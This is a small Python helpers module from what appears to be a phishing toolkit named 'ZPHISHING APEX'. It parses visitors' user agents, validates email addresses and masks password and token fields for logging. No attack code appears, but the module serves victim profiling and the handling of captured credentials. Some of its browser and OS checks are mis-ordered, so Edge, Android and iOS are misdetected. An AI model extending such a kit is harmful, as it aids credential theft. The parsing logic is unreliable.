#!/usr/bin/env python3
"""
ZPHISHING APEX — Helpers
"""

import os
import json
import re
from typing import Dict, Optional

class Helpers:
    def __init__(self):
        pass

    def get_location(self, ip: str) -> str:
        """Get location from IP"""
        return 'Unknown'

    def parse_user_agent(self, user_agent: str) -> Dict:
        """Parse user agent string"""
        ua_lower = user_agent.lower()

        # Detect device
        if any(x in ua_lower for x in ['mobile', 'android', 'iphone']):
            device = 'mobile'
        elif any(x in ua_lower for x in ['tablet', 'ipad']):
            device = 'tablet'
        else:
            device = 'desktop'

        # Detect browser
        if 'chrome' in ua_lower:
            browser = 'Chrome'
        elif 'firefox' in ua_lower:
            browser = 'Firefox'
        elif 'safari' in ua_lower:
            browser = 'Safari'
        elif 'edge' in ua_lower:
            browser = 'Edge'
        else:
            browser = 'Unknown'

        # Detect OS
        if 'windows' in ua_lower:
            os = 'Windows'
        elif 'mac' in ua_lower:
            os = 'macOS'
        elif 'linux' in ua_lower:
            os = 'Linux'
        elif 'android' in ua_lower:
            os = 'Android'
        elif 'ios' in ua_lower:
            os = 'iOS'
        else:
            os = 'Unknown'

        return {
            'device': device,
            'browser': browser,
            'os': os
        }

    def validate_email(self, email: str) -> bool:
        """Validate email address"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None

    def mask_sensitive_data(self, data: Dict) -> Dict:
        """Mask sensitive data for logging"""
        masked = data.copy()
        sensitive_keys = ['password', 'token', 'secret', 'key']

        for key in masked:
            if any(s in key.lower() for s in sensitive_keys):
                masked[key] = '***MASKED***'

        return masked
